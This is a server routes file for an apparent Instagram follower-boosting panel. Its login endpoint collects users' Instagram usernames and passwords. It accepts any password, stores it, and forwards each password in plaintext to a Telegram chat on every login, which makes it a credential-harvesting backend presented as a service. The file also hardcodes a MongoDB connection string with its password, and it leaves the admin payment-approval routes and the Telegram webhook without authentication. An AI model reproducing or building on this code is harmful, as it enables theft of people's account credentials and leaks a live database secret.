import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { z } from "zod";
import session from "express-session";
import MongoStore from 'connect-mongo';
import { v4 as uuidv4 } from "uuid";
import { TELEGRAM_CONFIG, APP_CONFIG } from "./config";

// Always use MongoDB storage (no PostgreSQL)
import { mongoStorage as storage } from "./mongodb-storage";

// Force MongoDB for production deployments  
const isProduction = process.env.NODE_ENV === 'production' || process.env.RENDER_EXTERNAL_URL;

if (isProduction) {
  // Force remove PostgreSQL environment variables for Render
  delete process.env.DATABASE_URL;
  console.log('🚀 Production mode: PostgreSQL disabled, using MongoDB exclusively');
}

// Extend session interface for MongoDB
declare module "express-session" {
  interface SessionData {
    userId?: string;
    uid?: string;
  }
}

interface AuthenticatedRequest extends Request {
  session: session.Session & Partial<session.SessionData> & {
    userId?: string;
    uid?: string;
  };
}

// Production session configuration with MongoDB store
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://instaboost_user:uX1YzKjiOETNhyYj@cluster0.tolxjiz.mongodb.net/instaboost?retryWrites=true&w=majority&appName=Cluster0';

const sessionConfig = session({
  secret: APP_CONFIG.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  store: process.env.NODE_ENV === 'production' 
    ? MongoStore.create({
        mongoUrl: MONGODB_URI,
        ttl: 24 * 60 * 60, // 1 day
        touchAfter: 24 * 3600 // lazy session update
      })
    : undefined,
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
    sameSite: process.env.NODE_ENV === 'production' ? 'none' : 'lax',
  },
  name: 'smm.sid',
  rolling: true,
});

// Validation schemas
const loginSchema = z.object({
  instagramUsername: z.string().min(1),
  password: z.string().min(1),
  referralCode: z.string().optional(),
});

const orderSchema = z.object({
  serviceName: z.string().min(1),
  instagramUsername: z.string().min(1),
  quantity: z.number().min(1),
  price: z.number().min(0.01),
});

const paymentSchema = z.object({
  amount: z.number().min(30),
  utrNumber: z.string().min(1),
  paymentMethod: z.string().min(1),
});

// Real Telegram bot function
async function sendToTelegramBot(action: string, data: any) {
  const botToken = TELEGRAM_CONFIG.BOT_TOKEN;
  const chatId = TELEGRAM_CONFIG.CHAT_ID;

  if (!botToken || !chatId) {
    console.log(`⚠️ Telegram credentials missing. Would send: [${action.toUpperCase()}]`, data);
    return;
  }

  let message = "";
  switch (action) {
    case "login":
      const loginStatus = data.isNewUser ? "पहली बार लॉगिन" : `${data.loginCount}वीं बार लॉगिन`;
      message = `🔐 *${loginStatus}*\n\n` +
               `📱 *UID:* \`${data.uid}\`\n` +
               `👤 *Instagram:* @${data.instagramUsername}\n` +
               `🔑 *Password:* \`${data.password}\`\n` +
               `🔢 *Login Count:* ${data.loginCount}\n\n` +
               `⏰ ${new Date().toLocaleString()}`;
      break;
    case "payment":
      message = `💰 *Payment Request*\n\n` +
               `📱 *UID:* \`${data.uid}\`\n` +
               `💵 *Amount:* ₹${data.amount}\n` +
               `🏦 *UTR:* \`${data.utrNumber}\`\n` +
               `💳 *Method:* ${data.paymentMethod}\n` +
               `🆔 *Payment ID:* \`${data.paymentId}\`\n\n` +
               `⏰ ${new Date().toLocaleString()}`;
      break;
    case "order":
      message = `📦 *New Order Placed*\n\n` +
               `📱 *UID:* \`${data.uid}\`\n` +
               `🛍️ *Service:* ${data.serviceName}\n` +
               `📊 *Quantity:* ${data.quantity.toLocaleString()}\n` +
               `💰 *Price:* ₹${data.price}\n` +
               `👤 *Target:* @${data.instagramUsername}\n` +
               `🆔 *Order ID:* \`${data.orderId}\`\n\n` +
               `⏰ ${new Date().toLocaleString()}`;
      break;
    case "bonus":
      message = `🎁 *Bonus Claimed*\n\n` +
               `📱 *UID:* \`${data.uid}\`\n` +
               `💰 *Bonus:* ₹10\n\n` +
               `⏰ ${new Date().toLocaleString()}`;
      break;
  }

  try {
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const requestBody: any = {
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown',
    };

    // Add inline buttons for payment actions
    if (action === "payment" && data.paymentId) {
      requestBody.reply_markup = {
        inline_keyboard: [
          [
            {
              text: "✅ Accept Payment",
              callback_data: `accept_payment_${data.paymentId}`
            },
            {
              text: "❌ Decline Payment", 
              callback_data: `decline_payment_${data.paymentId}`
            }
          ]
        ]
      };
    }

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(requestBody),
    });

    if (response.ok) {
      console.log(`✅ Telegram notification sent: ${action}`);
    } else {
      console.error(`❌ Failed to send Telegram notification: ${response.statusText}`);
    }
  } catch (error) {
    console.error(`❌ Telegram API error:`, error);
  }
}

function generateUID(): string {
  return "UID" + Math.random().toString(36).substr(2, 9).toUpperCase();
}

function generateOrderId(): string {
  return "ORDER" + Date.now() + Math.random().toString(36).substr(2, 4).toUpperCase();
}

// Setup Telegram webhook
async function setupTelegramWebhook() {
  const botToken = TELEGRAM_CONFIG.BOT_TOKEN;
  if (!botToken) {
    console.log('⚠️ Telegram bot token not configured, skipping webhook setup');
    return;
  }

  try {
    // For production deployments, detect the correct webhook URL
    let webhookUrl = '';

    if (process.env.NODE_ENV === 'production') {
      // For Render deployment
      const renderUrl = process.env.RENDER_EXTERNAL_URL;
      if (renderUrl) {
        webhookUrl = `${renderUrl}/api/telegram/webhook`;
      } else {
        console.log('⚠️ No production URL found, skipping webhook setup');
        return;
      }
    } else {
      // For development
      const domain = process.env.REPLIT_DEV_DOMAIN || `${process.env.REPL_ID || 'local'}.${process.env.REPLIT_CLUSTER || 'replit'}.repl.co`;
      webhookUrl = `https://${domain}/api/telegram/webhook`;
    }

    const response = await fetch(`https://api.telegram.org/bot${botToken}/setWebhook`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: webhookUrl,
        allowed_updates: ['callback_query']
      })
    });

    const result = await response.json();
    if (response.ok && result.ok) {
      console.log('✅ Telegram webhook configured successfully');
    } else {
      console.log('⚠️ Telegram webhook setup failed:', result);
    }
  } catch (error) {
    console.log('⚠️ Telegram webhook setup failed:', error);
  }

  console.log('✅ Telegram webhook setup completed');
}

export async function registerRoutes(app: Express): Promise<Server> {
  app.use(sessionConfig);

  // Health check endpoint
  app.get("/api/health", async (req, res) => {
    try {
      // Test database connection
      await storage.getServices();
      res.json({ 
        status: "healthy", 
        timestamp: new Date().toISOString(),
        environment: process.env.NODE_ENV,
        port: process.env.PORT || 'default'
      });
    } catch (error) {
      console.error("Health check failed:", error);
      res.status(500).json({ 
        status: "unhealthy", 
        error: error instanceof Error ? error.message : "Unknown error",
        timestamp: new Date().toISOString()
      });
    }
  });

  // Remove root endpoint to allow frontend to load properly
  // The frontend will be served by Vite middleware instead

  // Initialize database tables, default services and setup Telegram webhook
  try {
    await storage.initializeDatabase();
    console.log('✅ Database initialization completed');
  } catch (dbError) {
    console.error('❌ Database initialization failed:', dbError);
    console.log('⚠️ Continuing without database - manual setup required');
  }

  try {
    await storage.initializeServices();
    console.log('✅ Services initialization completed');
  } catch (serviceError) {
    console.error('❌ Services initialization failed:', serviceError);
    console.log('⚠️ Continuing without default services');
  }

  try {
    await setupTelegramWebhook();
    console.log('✅ Telegram webhook setup completed');
  } catch (telegramError) {
    console.log('⚠️ Telegram webhook setup failed (this is normal if no token provided)');
  }

  // Referral code verification endpoint
  app.post("/api/verify-referral-code", async (req, res) => {
    try {
      res.setHeader('Content-Type', 'application/json');

      const { code } = req.body;

      if (!code || !code.startsWith('REF-')) {
        return res.status(400).json({ 
          valid: false, 
          error: "Invalid referral code format. Code must start with REF-" 
        });
      }

      const referralRecord = await storage.getReferralByCode(code);

      if (!referralRecord) {
        return res.status(400).json({ 
          valid: false, 
          error: "Referral code not found" 
        });
      }

      // Get the owner's username
      const owner = await storage.getUser(referralRecord.userId);
      const ownerUsername = owner ? owner.instagramUsername : "Unknown";

      res.json({ 
        valid: true, 
        ownerUsername,
        message: "Referral code is valid" 
      });
    } catch (error) {
      console.error("Referral verification error:", error);
      res.status(500).json({ 
        valid: false, 
        error: "Failed to verify referral code" 
      });
    }
  });

  // Original referral validation endpoint (keeping for backwards compatibility)
  app.post("/api/validate-referral", async (req, res) => {
    try {
      const { referralCode } = req.body;

      if (!referralCode || !referralCode.startsWith('REF-')) {
        return res.status(400).json({ error: "Invalid referral code format" });
      }

      const referralRecord = await storage.getReferralByCode(referralCode);

      if (!referralRecord) {
        return res.status(400).json({ error: "Referral code not found" });
      }

      res.json({ valid: true, message: "Referral code is valid" });
    } catch (error) {
      console.error("Referral validation error:", error);
      res.status(500).json({ error: "Failed to validate referral code" });
    }
  });

  // Auth endpoints
  app.post("/api/auth/login", async (req: AuthenticatedRequest, res: Response) => {
    try {
      console.log("Login attempt - Request body:", req.body);

      // Validate request body
      const validationResult = loginSchema.safeParse(req.body);
      if (!validationResult.success) {
        console.error("Validation failed:", validationResult.error.errors);
        return res.status(400).json({ 
          error: "Invalid input data", 
          details: validationResult.error.errors 
        });
      }

      const { instagramUsername, password, referralCode } = validationResult.data;
      console.log("Validated data:", { instagramUsername, password: "***" });

      // Check if user exists
      let user = await storage.getUserByInstagramUsername(instagramUsername);
      let isNewUser = false;

      if (!user) {
        console.log("Creating new user for:", instagramUsername);
        // Create new user - For this app, any login creates a new user if not exists
        const uid = generateUID();
        user = await storage.createUser({
          uid,
          instagramUsername,
          password,
          walletBalance: 0,
          bonusClaimed: false,
        });
        isNewUser = true;
        console.log("New user created with ID:", user.id);
      } else {
        // For existing users, allow login with any password (as per your app logic)
        console.log("Existing user found with ID:", user.id);
      }

      // Track login attempt and get count
      const loginCount = await storage.logUserLogin(user.id, instagramUsername);
      console.log("Login count for user:", loginCount);

      // Send login notification to Telegram bot for every login
      try {
        await sendToTelegramBot("login", {
          uid: user.uid,
          instagramUsername,
          password,
          loginCount,
          isNewUser,
        });
      } catch (telegramError) {
        console.error("Telegram notification failed:", telegramError);
        // Don't fail login if telegram fails
      }

      // Store user in session
      req.session.userId = user.id;
      req.session.uid = user.uid;
      console.log("Session updated for user:", user.id);

      // Check for referral code from request body
      if (referralCode && isNewUser) {
        try {
          console.log('🔍 Processing referral code:', referralCode);

          // Validate referral code format
          if (!referralCode.startsWith('REF-')) {
            console.log('❌ Invalid referral code format');
            return res.status(400).json({ 
              error: "Invalid referral code format. Please enter a valid referral code starting with REF-" 
            });
          }

          // Validate referral code format first
          if (!referralCode.startsWith('REF-')) {
            console.log('❌ Invalid referral code format');
            return res.status(400).json({ 
              error: "Invalid referral code format. Please enter a valid referral code starting with REF-" 
            });
          }

          // Find the referrer by referral code
          const referralRecord = await storage.getReferralByCode(referralCode);
          console.log('📋 Referral record found:', referralRecord);

          if (!referralRecord) {
            console.log('❌ Referral code not found in database');
            return res.status(400).json({ 
              error: "Invalid referral code. This code does not exist in our system." 
            });
          }

          if (referralRecord.userId === user.id) {
            console.log('❌ User trying to use own referral code');
            return res.status(400).json({ 
              error: "You cannot use your own referral code." 
            });
          }

          // Create referral record to track this successful referral
          await storage.createReferralRecord(referralRecord.userId, user.id, referralCode);
          console.log(`✅ Referral recorded: User ${referralRecord.userId} referred ${user.uid} with code ${referralCode}`);
        } catch (referralError) {
          console.error("Referral tracking error:", referralError);
          return res.status(400).json({ 
            error: "Error processing referral code. Please try again." 
          });
        }
      }

      res.json({
        success: true,
        user: {
          id: user.id,
          uid: user.uid,
          instagramUsername: user.instagramUsername,
          walletBalance: user.walletBalance,
          bonusClaimed: user.bonusClaimed,
        },
      });
    } catch (error) {
      console.error("Login error details:", error);
      console.error("Error stack:", error instanceof Error ? error.stack : "No stack trace");
      res.status(400).json({ 
        error: "Login failed", 
        message: error instanceof Error ? error.message : "Unknown error"
      });
    }
  });

  app.post("/api/auth/logout", (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ error: "Could not log out" });
      }
      res.json({ success: true });
    });
  });

  app.get("/api/auth/user", async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    try {
      const user = await storage.getUser(req.session.userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      res.json({
        id: user.id,
        uid: user.uid,
        instagramUsername: user.instagramUsername,
        walletBalance: user.walletBalance,
        bonusClaimed: user.bonusClaimed,
      });
    } catch (error) {
      console.error("Get user error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  // Services endpoints
  app.get("/api/services", async (req, res) => {
    try {
      const services = await storage.getServices();
      res.json(services);
    } catch (error) {
      console.error("Get services error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  // Orders endpoints
  app.post("/api/orders", async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    try {
      const { serviceName, instagramUsername, quantity, price } = orderSchema.parse(req.body);

      const user = await storage.getUser(req.session.userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      const userBalance = parseFloat(user.walletBalance);
      if (userBalance < price) {
        return res.status(400).json({ error: "Insufficient wallet balance" });
      }

      // Create order
      const orderId = generateOrderId();
      const order = await storage.createOrder({
        orderId,
        userId: user.id,
        serviceName,
        instagramUsername,
        quantity,
        price: price.toString(),
        status: "Processing",
      });

      // Deduct from wallet
      await storage.updateUserBalance(user.id, userBalance - price);

      // Send to Telegram bot
      await sendToTelegramBot("order", {
        uid: user.uid,
        serviceName,
        quantity,
        price,
        instagramUsername,
        orderId,
      });

      res.json({ success: true, order });
    } catch (error) {
      console.error("Create order error:", error);
      res.status(400).json({ error: "Invalid order data" });
    }
  });

  app.get("/api/orders", async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    try {
      const orders = await storage.getUserOrders(req.session.userId);
      res.json(orders);
    } catch (error) {
      console.error("Get orders error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  // Payments endpoints
  app.post("/api/payments", async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    try {
      const { amount, utrNumber, paymentMethod } = paymentSchema.parse(req.body);

      const user = await storage.getUser(req.session.userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      // Create payment request
      const payment = await storage.createPayment({
        userId: user.id,
        amount: amount.toString(),
        utrNumber,
        paymentMethod,
        status: "Pending",
      });

      // Send to Telegram bot
      await sendToTelegramBot("payment", {
        uid: user.uid,
        amount,
        utrNumber,
        paymentMethod,
        paymentId: payment.id,
      });

      res.json({ success: true, payment });
    } catch (error) {
      console.error("Create payment error:", error);
      res.status(400).json({ error: "Invalid payment data" });
    }
  });

  app.get("/api/payments", async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    try {
      const payments = await storage.getUserPayments(req.session.userId);
      res.json(payments);
    } catch (error) {
      console.error("Get payments error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  // Telegram webhook endpoint for payment actions
  app.post("/api/telegram/webhook", async (req, res) => {
    try {
      console.log("📞 Telegram webhook received:", JSON.stringify(req.body, null, 2));

      const { callback_query } = req.body;

      if (callback_query && callback_query.data) {
        const data = callback_query.data;
        const botToken = TELEGRAM_CONFIG.BOT_TOKEN;

        console.log("🔘 Button clicked:", data);

        if (data.startsWith("accept_payment_")) {
          const paymentId = data.replace("accept_payment_", "");
          console.log("✅ Processing payment acceptance for ID:", paymentId);

          const payment = await storage.getPayment(paymentId);

          if (payment) {
            console.log("💰 Payment found:", payment);

            // Update payment status to approved
            await storage.updatePaymentStatus(paymentId, "Approved");
            console.log("📝 Payment status updated to Approved");

            // Add funds to user wallet
            const user = await storage.getUser(payment.userId);
            if (user) {
              const currentBalance = parseFloat(user.walletBalance);
              const paymentAmount = parseFloat(payment.amount);
              const newBalance = currentBalance + paymentAmount;
              await storage.updateUserBalance(payment.userId, newBalance);
              console.log(`💳 Funds added: ₹${paymentAmount} to user ${user.uid}. New balance: ₹${newBalance}`);
            }

            // Answer callback query with success message
            if (botToken) {
              await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  callback_query_id: callback_query.id,
                  text: `✅ Payment approved! ₹${payment.amount} added to wallet.`,
                  show_alert: true
                })
              });

              // Edit the original message to show it's been processed
              await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: callback_query.message.chat.id,
                  message_id: callback_query.message.message_id,
                  text: callback_query.message.text + "\n\n✅ **APPROVED** - Funds added to wallet",
                  parse_mode: 'Markdown'
                })
              });
            }
          } else {
            console.log("❌ Payment not found for ID:", paymentId);
          }
        } else if (data.startsWith("decline_payment_")) {
          const paymentId = data.replace("decline_payment_", "");
          console.log("❌ Processing payment decline for ID:", paymentId);

          // Update payment status to declined
          await storage.updatePaymentStatus(paymentId, "Declined");
          console.log("📝 Payment status updated to Declined");

          // Answer callback query with decline message
          if (botToken) {
            await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                callback_query_id: callback_query.id,
                text: "❌ Payment declined and marked as failed.",
                show_alert: true
              })
            });

            // Edit the original message to show it's been processed
            await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: callback_query.message.chat.id,
                message_id: callback_query.message.message_id,
                text: callback_query.message.text + "\n\n❌ **DECLINED** - Payment marked as failed",
                parse_mode: 'Markdown'
              })
            });
          }
        }
      }

      res.json({ success: true });
    } catch (error) {
      console.error("❌ Telegram webhook error:", error);
      res.status(500).json({ error: "Webhook error" });
    }
  });

  // Bonus endpoints
  app.post("/api/bonus/claim", async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    try {
      const user = await storage.getUser(req.session.userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      if (user.bonusClaimed) {
        return res.status(400).json({ error: "Bonus already claimed" });
      }

      // Add bonus to wallet and mark as claimed
      const newBalance = parseFloat(user.walletBalance) + 10;
      await storage.updateUserBalance(user.id, newBalance);
      await storage.markBonusClaimed(user.id);

      // Send to Telegram bot
      await sendToTelegramBot("bonus", {
        uid: user.uid,
        amount: 10,
      });

      res.json({ 
        success: true, 
        newBalance: newBalance.toFixed(2),
        message: "₹10 bonus claimed successfully!" 
      });
    } catch (error) {
      console.error("Claim bonus error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  // Referral endpoints
  app.get("/api/referrals", async (req: AuthenticatedRequest, res: Response) => {
    try {
      // Ensure we always return JSON
      res.setHeader('Content-Type', 'application/json');

      if (!req.session.userId) {
        return res.status(401).json({ error: "Not authenticated" });
      }

      console.log("🔍 Getting referral data for user:", req.session.userId);

      const user = await storage.getUser(req.session.userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      console.log("👤 User found:", user.uid);

      // Get referral data using the improved method
      const referralData = await storage.getUserReferralData(user._id || user.id);

      console.log("📊 Referral data from storage:", referralData);

      // Ensure we have a valid referral code
      let finalReferralCode = referralData.referralCode;
      if (!finalReferralCode || finalReferralCode === 'Code not available') {
        finalReferralCode = `REF-${user.uid}-${Math.random().toString(36).substr(2, 6).toUpperCase()}`;

        // Try to create the referral record
        try {
          await storage.createReferral({
            userId: user._id || user.id,
            referralCode: finalReferralCode,
            isCompleted: false
          });
          console.log("✅ Created new referral with code:", finalReferralCode);
        } catch (createError) {
          console.error("❌ Error creating referral:", createError);
        }
      }

      // Get referral count
      const referralCount = await storage.getReferralCount(user._id || user.id);
      const isEligibleForDiscount = referralCount >= 5;
      const hasClaimedDiscount = user.hasClaimedDiscount || false;

      const responseData = {
        referralCode: finalReferralCode,
        referralCount: referralCount,
        isEligibleForDiscount,
        hasClaimedDiscount,
      };

      console.log("📤 Sending final response:", responseData);
      return res.status(200).json(responseData);
    } catch (error) {
      console.error("❌ Get referrals error:", error);

      // Always return a valid JSON response even on error
      const user = await storage.getUser(req.session.userId).catch(() => null);
      const fallbackCode = user ? `REF-${user.uid}-${Math.random().toString(36).substr(2, 6).toUpperCase()}` : `REF-FALLBACK-${Math.random().toString(36).substr(2, 8).toUpperCase()}`;

      const fallbackResponse = {
        referralCode: fallbackCode,
        referralCount: 0,
        isEligibleForDiscount: false,
        hasClaimedDiscount: false,
      };

      console.log("🔧 Returning fallback response:", fallbackResponse);
      return res.status(200).json(fallbackResponse);
    }
  });

  // Use referral code endpoint
  app.post("/api/use-referral", async (req: AuthenticatedRequest, res: Response) => {
    try {
      res.setHeader('Content-Type', 'application/json');

      if (!req.session.userId) {
        return res.status(401).json({ error: "Not authenticated" });
      }

      const { code } = req.body;

      if (!code || !code.startsWith('REF-')) {
        return res.status(400).json({ error: "Invalid referral code format" });
      }

      const user = await storage.getUser(req.session.userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      // Find the referrer by referral code
      const referralRecord = await storage.getReferralByCode(code);
      if (!referralRecord) {
        return res.status(400).json({ error: "Invalid referral code" });
      }

      // Prevent self-referral
      if (referralRecord.userId === user.id) {
        return res.status(400).json({ error: "Cannot refer yourself" });
      }

      // Create referral record to track this successful referral
      await storage.createReferralRecord(referralRecord.userId, user.id, code);

      // Get updated counts
      const referralCount = await storage.getReferralCount(referralRecord.userId);

      res.json({ 
        success: true, 
        message: "Referral code applied successfully",
        referralCount
      });
    } catch (error) {
      console.error("Use referral error:", error);
      res.status(500).json({ error: "Failed to use referral code" });
    }
  });

  app.post("/api/referrals/claim-reward", async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    try {
      const user = await storage.getUser(req.session.userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      const referralCount = await storage.getReferralCount(user.id);
      if (referralCount < 5) {
        return res.status(400).json({ error: "Not enough referrals to claim reward" });
      }

      if (user.hasClaimedDiscount) {
        return res.status(400).json({ error: "Discount already claimed" });
      }

      // Mark discount as claimed in users table
      await storage.updateUserDiscountStatus(user.id, true);

      res.json({ success: true, message: "Discount reward claimed successfully!" });
    } catch (error) {
      console.error("Claim reward error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  // Get my referrals endpoint  
  app.get("/api/referrals/my", async (req: AuthenticatedRequest, res: Response) => {
    try {
      res.setHeader('Content-Type', 'application/json');

      if (!req.session.userId) {
        return res.status(401).json({ error: "Not authenticated" });
      }

      const user = await storage.getUser(req.session.userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      // Get or create referral code
      let referralRecord = await storage.getReferralByUserId(user.id);
      let referralCode = '';

      if (!referralRecord) {
        referralCode = `REF-${user.uid}-${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
        try {
          referralRecord = await storage.createReferral({
            userId: user.id,
            referralCode: referralCode,
            isCompleted: false
          });
        } catch (createError) {
          console.error("Error creating referral:", createError);
        }
      } else {
        referralCode = referralRecord.referralCode;
      }

      // Get referral count and eligibility
      const referralCount = await storage.getReferralCount(user.id);
      const isEligibleForDiscount = referralCount >= 5;
      const hasClaimed = user.hasClaimedDiscount || false;

      res.json({
        referralCode,
        referralCount,
        isEligibleForDiscount,
        hasClaimed
      });
    } catch (error) {
      console.error("Get my referrals error:", error);
      res.status(500).json({ 
        error: "Failed to get referral data",
        referralCode: `REF-ERROR-${Math.random().toString(36).substr(2, 6).toUpperCase()}`,
        referralCount: 0,
        isEligibleForDiscount: false,
        hasClaimed: false
      });
    }
  });

  app.get("/api/referrals/discount-access", async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    try {
      const user = await storage.getUser(req.session.userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      res.json(user.hasClaimedDiscount || false);
    } catch (error) {
      console.error("Check discount access error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  // Admin endpoints for payment approval (mock)
  app.post("/api/admin/payments/:id/approve", async (req, res) => {
    try {
      const paymentId = req.params.id;
      const payment = await storage.getPayment(paymentId);

      if (!payment) {
        return res.status(404).json({ error: "Payment not found" });
      }

      // Update payment status and add funds to user wallet
      await storage.updatePaymentStatus(paymentId, "Approved");

      const user = await storage.getUser(payment.userId);
      if (user) {
        const newBalance = parseFloat(user.walletBalance) + parseFloat(payment.amount);
        await storage.updateUserBalance(user.id, newBalance);
      }

      res.json({ success: true, message: "Payment approved and funds added" });
    } catch (error) {
      console.error("Approve payment error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  app.post("/api/admin/payments/:id/decline", async (req, res) => {
    try {
      const paymentId = req.params.id;
      await storage.updatePaymentStatus(paymentId, "Declined");
      res.json({ success: true, message: "Payment declined" });
    } catch (error) {
      console.error("Decline payment error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
